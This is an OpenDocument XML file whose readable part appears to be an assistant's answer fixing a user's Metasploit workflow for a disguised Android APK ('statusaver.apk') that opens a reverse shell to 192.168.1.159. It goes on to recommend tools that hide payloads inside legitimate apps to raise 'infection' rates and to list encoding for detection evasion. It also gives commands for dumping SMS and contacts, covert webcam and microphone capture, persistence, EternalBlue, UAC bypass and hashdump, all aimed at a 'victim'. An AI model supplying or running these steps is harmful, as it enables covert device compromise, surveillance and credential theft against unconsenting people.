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cmr10" svg:font-family="cmr10"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2.3083in" style:rel-column-width="21845*"/>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P1" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="00095b2b"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-style="italic" fo:font-weight="bold" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="000b1440"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-left="0in" fo:text-indent="0in" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="115%"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-weight="bold" officeooo:paragraph-rsid="00095b2b" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L1"/>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="11pt" fo:font-weight="bold" style:font-size-asian="11pt" style:font-weight-asian="bold" style:font-size-complex="11pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L2"/>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L2">
      <style:text-properties officeooo:paragraph-rsid="000cebae"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="000cebae"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="115%"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="115%"/>
      <style:text-properties officeooo:paragraph-rsid="000cebae"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="115%"/>
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="000de6d8"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="10.5pt" fo:font-weight="bold" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="10.5pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="150%"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:background-color="#729fcf"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:font-name="cmr10" fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0.0398in" fo:margin-bottom="0.0398in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="000ebb8f" officeooo:paragraph-rsid="000ebb8f" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="000ebb8f"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#069a2e" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#069a2e" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="000f36f7"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#729fcf" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" fo:background-color="#ffffd7" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="000ffa8b"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#729fcf" loext:opacity="100%" officeooo:paragraph-rsid="000ffa8b"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="00107e98" officeooo:paragraph-rsid="00107e98" style:font-size-asian="13pt" style:font-weight-asian="bold" style:font-size-complex="13pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="13pt" fo:font-weight="bold" style:font-size-asian="13pt" style:font-weight-asian="bold" style:font-size-complex="13pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="0019e560"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-weight="bold" officeooo:paragraph-rsid="0019e560" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="15pt" fo:font-weight="bold" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#069a2e" loext:opacity="100%" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:font-size="15pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:paragraph-rsid="001af1c1" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false"/>
    </style:style>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able_20_Contents">
      <style:paragraph-properties fo:text-align="left" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L20"/>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L21"/>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L22"/>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L23"/>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L24"/>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L25"/>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L26"/>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L26">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L27"/>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L27">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L28"/>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L28">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L29"/>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L29">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L30"/>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Preformatted_20_Text" style:list-style-name="L30">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L31"/>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L32"/>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L33"/>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Table_20_Heading">
      <style:paragraph-properties fo:text-align="left" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L34"/>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L35"/>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L36"/>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L37"/>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L38"/>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L39"/>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L40"/>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L41"/>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L42"/>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L43"/>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L44"/>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L45"/>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0015cdf6" officeooo:paragraph-rsid="0015cdf6" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P96" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L46"/>
    <style:style style:name="P97" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L47"/>
    <style:style style:name="P98" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L48"/>
    <style:style style:name="P99" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L49"/>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font-name="cmr10" fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#069a2e" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#729fcf" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-size="13pt" fo:font-weight="bold" style:font-size-asian="13pt" style:font-weight-asian="bold" style:font-size-complex="13pt" style:font-weight-complex="bold"/>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weight="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Liberation Mono"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="Liberation Mono" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Liberation Mono" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="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etasploit commands and comprehensive information about managing sessions.</text:span> </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Your main issues are:</text:p>
      <text:p text:style-name="P1"><text:s/>1) the payload was generated correctly, but </text:p>
      <text:p text:style-name="P1"><text:s/>2) you typed multihandler instead of multi/handler, and</text:p>
      <text:p text:style-name="P1"><text:s/>3) the payload format in the handler was incorrect (missing the "/").</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P2">Corrected Full Commands:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Here's the complete, corrected workflow for your Android payload:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 1</text:span>: <text:span text:style-name="T3">Generate the Android Payload</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=8080 -o statusaver.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text">This creates your malicious APK file .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P3">Step 2: Start Metasploit Console</text:p>
      <text:p text:style-name="Preformatted_20_Text">msfconsole -q</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P3">Step 3: Configure the Handler (Corrected)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="Preformatted_20_Text">use exploit/multi/handler <text:s text:c="21"/># Note: multi/handler (with slash, not multihandler)</text:p>
      <text:p text:style-name="Preformatted_20_Text">set payload android/meterpreter/reverse_tcp <text:s text:c="3"/># Correct format with the "/"</text:p>
      <text:p text:style-name="Preformatted_20_Text">set LHOST 192.168.1.159</text:p>
      <text:p text:style-name="Preformatted_20_Text">set LPORT 8080</text:p>
      <text:p text:style-name="Preformatted_20_Text">show options <text:s text:c="35"/># Verify settings</text:p>
      <text:p text:style-name="Preformatted_20_Text">run</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P3">Step 4: Transfer and Install</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">On your Kali machine, start a web server to share the APK:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 -m http.server 80</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Then on the Android device, download and install statusaver.apk. Once the victim opens the app, you'll get a Meterpreter session .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Understanding MSF Sessions</text:p>
      <text:p text:style-name="P2">What is a Session?</text:p>
      <text:p text:style-name="Preformatted_20_Text">A session in Metasploit represents an active connection to a compromised target system. Think of it as your "foothold" on the victim's device .</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Types of Sessions</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">Session Type<text:tab/> <text:s text:c="18"/>Description<text:tab/>Capabilities</text:p>
      <text:p text:style-name="P5">Meterpreter Session<text:tab/> <text:s text:c="11"/>Advanced, feature-rich shell<text:tab/>File operations, <text:s text:c="25"/>, <text:s text:c="33"/>keylogging,webcam access, privilege escalation, <text:s text:c="9"/>, <text:s text:c="33"/>process migration</text:p>
      <text:p text:style-name="Preformatted_20_Text">Shell Session<text:tab/>Basic command shell<text:tab/>Simple command execution, limited functionality</text:p>
      <text:p text:style-name="Preformatted_20_Text">VNC Session<text:tab/>Graphical remote control<text:tab/>Full GUI access to Android screen</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Essential Session Management Commands</text:p>
      <text:p text:style-name="Preformatted_20_Text">Once you have a session (or multiple sessions), here's how to manage them :</text:p>
      <text:p text:style-name="Preformatted_20_Text">Command<text:tab/>Purpose<text:tab/>Example</text:p>
      <text:p text:style-name="Preformatted_20_Text">sessions -l<text:tab/>List all active sessions<text:tab/>Shows ID, type, target info</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>sessions -i &lt;ID&gt;<text:tab/>Interact with specific session<text:tab/>sessions -i 1</text:p>
      <text:p text:style-name="Preformatted_20_Text">sessions -k &lt;ID&gt;<text:tab/>Kill/terminate a session<text:tab/>sessions -k 1</text:p>
      <text:p text:style-name="Preformatted_20_Text">sessions -n &lt;name&gt; &lt;ID&gt;<text:tab/>Rename session for organization<text:tab/>sessions -n VictimPhone 1</text:p>
      <text:p text:style-name="Preformatted_20_Text">background<text:tab/>Return to msf prompt without closing session<text:tab/>Type background in Meterpreter</text:p>
      <text:p text:style-name="Preformatted_20_Text">sysinfo<text:tab/>Get system information (inside session)<text:tab/>Shows OS, architecture</text:p>
      <text:p text:style-name="Preformatted_20_Text">check_root<text:tab/>Check if device is rooted<text:tab/>Android-specific</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">Working with Multiple Sessions:</text:p>
      <text:p text:style-name="Preformatted_20_Text">When you compromise multiple devices, you'll have several sessions active. Here's how to handle them :</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. List all sessions: sessions -l</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Switch between sessions: sessions -i 2 (switch to session 2)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Background current session: Type background</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Run jobs in background: run -j (runs handler as background job)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>5. Send commands to all sessions: Not directly possible; use resource scripts</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">GitHub Resources for Android Payloads</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">Here are some excellent GitHub repositories to enhance your Android penetration testing:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">1. Android-RAT</text:p>
      <text:p text:style-name="Preformatted_20_Text">URL: https://github.com/sa-fw-an/Android-RAT</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool addresses the biggest challenge with modern Android versions (12-15): payload compatibility. Android 12+ requires payloads to have a visible UI for advanced features like webcam and screenshots to work.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Key Features:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Generates Android Meterpreter APKs via msfvenom</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Patches APKs to add visible UI for Android 12/13/14/15 compatibility</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Signs APKs for installation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Starts Metasploit multi/handler automatically</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Simple CLI menu interface</text:p>
      <text:p text:style-name="Preformatted_20_Text">Why it's valuable: Without this patching, your payload may not function properly on newer Android devices due to permission restrictions .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">2. Cyrus - The Virus</text:p>
      <text:p text:style-name="Preformatted_20_Text">URL: https://github.com/Clock-Skew/Cyrus</text:p>
      <text:p text:style-name="Preformatted_20_Text">This tool embeds Meterpreter payloads into legitimate third-party APKs, making them much harder to detect.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Key Features:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Injects payload into existing APKs (games, apps, etc.)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Merges permissions automatically</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Optionally obfuscates payload package names</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Rebuilds signed APK ready for installation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Attempts auto-start via launcher activity</text:p>
      <text:p text:style-name="Preformatted_20_Text">Why it's valuable: A custom APK looks suspicious, but embedding in a legitimate app (like a game) greatly increases infection成功率 .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">3. MSFvenom Payload Generator</text:p>
      <text:p text:style-name="Preformatted_20_Text">URL: https://github.com/Allu555/MSFvenom-Payload-Generator</text:p>
      <text:p text:style-name="Preformatted_20_Text">A professional, interactive tool for generating payloads across multiple platforms.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Key Features:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Multi-platform support (Windows, Linux, Android, Mac, Web)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Encoding support with customizable iterations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Auto-generates listener configurations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Organized output structure</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Color-coded interface</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>Why it's valuable: It organizes payloads by category and creates ready-to-use listener RC files .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">20 Additional Examples on Related Topics</text:p>
      <text:p text:style-name="P6">Android-Specific Examples</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Generate Android payload with HTTPS transport (more stealthy):</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p android/meterpreter/reverse_https LHOST=192.168.1.159 LPORT=443 -o https_payload.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Encode payload to evade detection :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=8080 -e x86/shikata_ga_nai -i 5 -o encoded.apk</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Android post-exploitation commands (inside session) :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">dump_contacts <text:s text:c="7"/># Extract contacts</text:p>
      <text:p text:style-name="Preformatted_20_Text">dump_sms <text:s text:c="12"/># Retrieve text messages</text:p>
      <text:p text:style-name="Preformatted_20_Text">webcam_snap <text:s text:c="9"/># Take photo</text:p>
      <text:p text:style-name="Preformatted_20_Text">record_mic <text:s text:c="10"/># Record audio</text:p>
      <text:p text:style-name="Preformatted_20_Text">geolocate <text:s text:c="11"/># Get GPS coordinates</text:p>
      <text:p text:style-name="Preformatted_20_Text">check_root <text:s text:c="10"/># Check if device rooted</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Android persistence (survive reboot) :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">run persistence -X <text:s text:c="2"/># Create persistent backdoor</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P3">Windows Exploitation Examples</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/><text:span text:style-name="T2"><text:s/>1. EternalBlue exploit (MS17-010)</text:span> :</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set payload windows/x64/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set RHOST 192.168.1.100</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set LHOST 192.168.1.159</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; run</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Windows executable payload:</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f exe -o payload.exe</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Windows PowerShell payload :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.159 LPORT=4444 -f ps1 -o payload.ps1</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. UAC bypass on Windows :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; use exploit/windows/local/bypassuac</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set SESSION 1</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; set payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="Preformatted_20_Text">msf6 &gt; run</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Dump Windows password hashes (post-exploitation):</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">hashdump</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/><text:span text:style-name="T2">1. Migrate to stable process :</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">migrate explorer.exe</text:p>
      <text:p text:style-name="Preformatted_20_Text">Linux Exploitation Examples</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/><text:span text:style-name="T2"><text:s/>1. Linux executable payload:</text:span></text:p>
